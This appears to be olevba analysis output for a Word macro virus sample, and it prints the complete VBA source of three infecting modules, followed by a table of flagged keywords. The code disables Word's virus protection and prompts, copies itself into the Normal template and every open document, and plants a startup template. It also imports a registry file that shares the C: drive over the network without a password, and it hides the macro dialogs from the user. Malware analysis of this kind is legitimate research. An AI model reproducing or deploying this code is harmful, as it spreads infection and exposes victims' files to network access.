olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Thus.dg
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Thus.dg - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
'Surgeon'
On Error Resume Next
With Application.Options
 .ConfirmConversions = False
 .VirusProtection = False
 .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
'This is small fun'
Dim nt As Object, ad As Object
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If nt.Lines(12, 1) <> "'This is small fun'" Then nt.DeleteLines 1, nt.CountOfLines
If nt.CountOfLines = 0 Then nt.InsertLines 1, ad.Lines(1, ad.CountOfLines)
If NormalTemplate.Saved = False Then NormalTemplate.Save
For k = 1 To Application.Documents.Count
    With Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule
     If .Lines(12, 1) <> "'This is small fun'" Then .DeleteLines 1, .CountOfLines
     If .CountOfLines = 0 Then .InsertLines 1, nt.Lines(1, nt.CountOfLines)
    End With
Next k
With Application.FileSearch
    .NewSearch
    .LookIn = "C:\Program Files\Microsoft Office\Office\STARTUP"
    .SearchSubFolders = False
    If .Execute > 0 Then GoTo r1
End With
Documents.Add Template:="", NewTemplate:=True
    ActiveDocument.SaveAs FileName:= _
        "C:\Program Files\Microsoft Office\Office\STARTUP\autosave.dot", _
        FileFormat:=wdFormatTemplate, LockComments:=False, Password:="", _
        AddToRecentFiles:=True, WritePassword:="", ReadOnlyRecommended:=False, _
        EmbedTrueTypeFonts:=False, SaveNativePictureFormat:=False, SaveFormsData _
        :=False, SaveAsAOCELetter:=False
   With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
        .AddFromString ("sub viewvbcode()" & ":" & "end sub")
        .AddFromString ("sub ToolsMacro()" & ":" & "end sub")
        .AddFromString ("sub FileTemplates()" & ":" & "end sub")
        
    ActiveDocument.Save
    ActiveDocument.Close
  End With
r1:
Dim c As String
If Asc((System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\C", _
     "Flags")) = 146) Then GoTo exits1
Open "c:\nc.dll" For Output As #1
c = "REGEDIT4"
Print #1, c
c = "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\C]"
Print #1, c
c = Chr(34) & "Flags" & Chr(34) & "=dword:00000192"
Print #1, c
c = Chr(34) & "Type" & Chr(34) & "=dword:00000000"
Print #1, c
c = Chr(34) & "Path" & Chr(34) & "=" & Chr(34) & "C:\\" & Chr(34)
Print #1, c
c = Chr(34) & "Parm2enc" & Chr(34) & "=hex:"
Print #1, c
c = Chr(34) & "Parm1enc" & Chr(34) & "=hex:"
Print #1, c
c = Chr(34) & "Remark" & Chr(34) & "=" & Chr(34) & Chr(34)
Print #1, c
Close #1
Shell "regedit c:\nc.dll"
Kill "c:\nc.dll"
exits1:
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub

















































-------------------------------------------------------------------------------
VBA MACRO BillyBull.bas 
in file: ./Virus.MSWord.Thus.dg - OLE stream: 'Macros/VBA/BillyBull'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const NStat = 1
Const VStat = 1
'Copyright © 2001 by GremMe&Zergo from dd!Actor.
'All rights reserved.

Sub AutoOpen()
RunMeAldays

Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean

pth = Environ("temp") & "\~WRD000^.tmp"
Set dc = NormalTemplate.VBProject.VBComponents

For i = 1 To dc.Count
    If dc(i).Name = "BillyBull" Then
        NInst = 1
        dc(i).Export pth
    End If
Next i

Set dc = ActiveDocument.VBProject.VBComponents

For i = 1 To dc.Count
    If dc(i).Name = "BillyBull" Then
        AInst = 1
        dc(i).Export pth
    End If
Next i

If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
    dc.VBProject.VBComponents.import pth
    dc.Save
'    If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
    Kill pth
End If

End Sub

Sub AutoExec()
    RunMeAldays
End Sub

Sub FileSave()
'On Error Resume Next
    AutoOpen
'    RunMeAldays
    Pricol
    ActiveDocument.Save
End Sub

Sub FileSaveAs()
On Error Resume Next
    AutoOpen
'    RunMeAldays
    Pricol
    Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub ToolsOptions()
Dim dc As Object
Dim VirStat As Byte
Dim NorStat As Byte

On Error Resume Next

Options.SaveNormalPrompt = NStat
Options.VirusProtection = VStat
Dialogs(wdDialogToolsOptions).Show

Set dc = ActiveDocument.VBProject.VBComponents("BillyBull").CodeModule
If Options.SaveNormalPrompt = True Then NorStat = 1
If Options.VirusProtection = True Then VirStat = 1

dc.replaceline 2, "const NStat=" & NorStat
dc.replaceline 3, "const VStat=" & VirStat

Options.SaveNormalPrompt = 0
Options.VirusProtection = 0

NormalTemplate.Save
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
Dim i As Byte, n As Integer, pth As String
Dim NInst As Boolean, AInst As Boolean, Nsav As Boolean, Asav As Boolean, res As Boolean
Dim dc As Object, dcN As Object, dcA As Object

MsgBox ("toolmacro")
On Error Resume Next

pth = Environ("temp") & "\~WRD000^.tmp"

Set dcN = NormalTemplate.VBProject.VBComponents
Set dcA = ActiveDocument.VBProject.VBComponents

Set dc = NormalTemplate.VBProject
GoSub 10
NInst = res

Set dc = ActiveDocument.VBProject
GoSub 10
AInst = res

If NInst = True Then
    Set dc = dcN
    GoSub 20
    Nsav = NormalTemplate.Saved
    NormalTemplate.Saved = 1
End If

If AInst = True Then
    Set dc = dcA
    GoSub 20
    Asav = ActiveDocument.Saved
    ActiveDocument.Saved = 1
End If

Dialogs(wdDialogToolsMacro).Show

dcN("BillyBull").CodeModule.AddFromFile pth
dcA("BillyBull").CodeModule.AddFromFile pth
dcN.CodeModule.AddFromFile pth

NormalTemplate.Saved = Nsav
dcA.CodeModule.AddFromFile pth

ActiveDocument.Saved = Asav
Kill pth
Exit Sub

10:
For i = 1 To dc.VBComponents.Count
    If dc.VBComponents(i).Name = "BillyBull" Then
        res = 1
        dc.VBComponents(i).Export pth
    End If
Next i
Return

20:
dc.Export pth
n = dc("BillyBull").CodeModule.CountOfLines
dc("BillyBull").CodeModule.DeleteLines 1, n
Return

End Sub
Sub ViewVBCode()
Dim i As Byte, j As Byte
Dim n As Integer, pth As String
Dim dc As Object, dcN As Object, dcA As Object
'If Dir("c:\autoexec.bat") <> "" Then
'    If FileLen("c:\autoexec.bat") <> 777 Then
'        RunMeAldays
'        Pricol
'        Exit Sub
'        Else
'Dialogs(wdDialogToolsMacro).Show
Set dc = NormalTemplate.VBProject
'        Application.VBE.MainWindow.Visible = False
        Application.VBE.MainWindow.Visible = True
'NormalTemplate.VBProject.VBComponents.Import ("C:\module1.")
'NormalTemplate.VBProject.VBComponents.Item(2).Export ("qqq")
'NormalTemplate.VBProject.VBComponents.Remove (NormalTemplate.VBProject.VBComponents.Item(2))

For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(i).Name = "BillyBull1" Then
        Set dc = NormalTemplate.VBProject.VBComponents.Item(i)
        n = dc.CodeModule.CountOfLines
        dc.CodeModule.DeleteLines 1, n
        NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.InsertLines(1, "wwww") = "qq"
'        NormalTemplate.VBProject.VBComponents.Remove
'        NormalTemplate.VBProject.VBComponents.Remove (NormalTemplate.VBProject.VBComponents.Item(i))
    End If
Next i

NormalTemplate.Saved = 1
'Set dc = NormalTemplate.VBProject.VBComponents("BillyBull").CodeModule

'For i = 1 To dc.VBComponents.Count
'    If dc.VBComponents(i).Name = "BillyBull" Then
'        For j = 1 To Application.VBE.Windows.Count
'            Application.VBE.Windows(1).Visible = False
''            Application.VBE.Windows(j).Visible = False
'        Next j
''        NormalTemplate.VBProject.VBComponents(i).VBE.Windows.
'    End If
'Next i
'            Application.VBE.MainWindow.Visible = True
'    End If
'End If
End Sub
Sub RunMeAldays()
    Application.EnableCancelKey = wdCancelDisabled
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
    Application.VBE.MainWindow.Visible = False
End Sub

Sub Pricol()
'    ActiveDocument.PageSetup.LeftMargin = InchesToPoints(2.5)
'    ActiveDocument.PageSetup.RightMargin = InchesToPoints(2.5)
'    ActiveDocument.PageSetup.BottomMargin = InchesToPoints(2.5)
'    ActiveDocument.PageSetup.TopMargin = InchesToPoints(2.5)
'
'    ActiveDocument.UndoClear
End Sub


-------------------------------------------------------------------------------
VBA MACRO TheSecond.bas 
in file: ./Virus.MSWord.Thus.dg - OLE stream: 'Macros/VBA/TheSecond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  Copyrights = "The Second, 2000"
  NickName = "Revenger"
  Options.VirusProtection = False
  flag = False
  If Documents.Count >= 1 Then
    counter = NormalTemplate.VBProject.VBComponents.Count
    For i = 1 To counter
      If NormalTemplate.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    x = Application.StartupPath + "\TheSecond.tmp"
    If Not flag Then
      ActiveDocument.VBProject.VBComponents("TheSecond").Export (x)
      NormalTemplate.VBProject.VBComponents.import (x)
    End If
    flag = False
    infected = False
    havesave = ActiveDocument.Saved
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    If Not flag Then
      NormalTemplate.VBProject.VBComponents("TheSecond").Export (x)
      ActiveDocument.VBProject.VBComponents.import (x)
      infected = True
    End If
    If havesave And infected And (Left(ActiveDocument.Name, 8) <> "Документ") Then
      
      Dialogs(wdDialogFileSaveAs).Execute
    End If
    ActiveDocument.Saved = havesave
  End If
End Sub
Sub FilePrint()
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Нюбин"
    .Replacement.Text = "Нудин"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  Dialogs(wdDialogFilePrint).Show
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Нудин"
    .Replacement.Text = "Нюбин"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("Нет загруженных макросов!")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |nc.dll              |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Base64    |O*^                 |Type                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

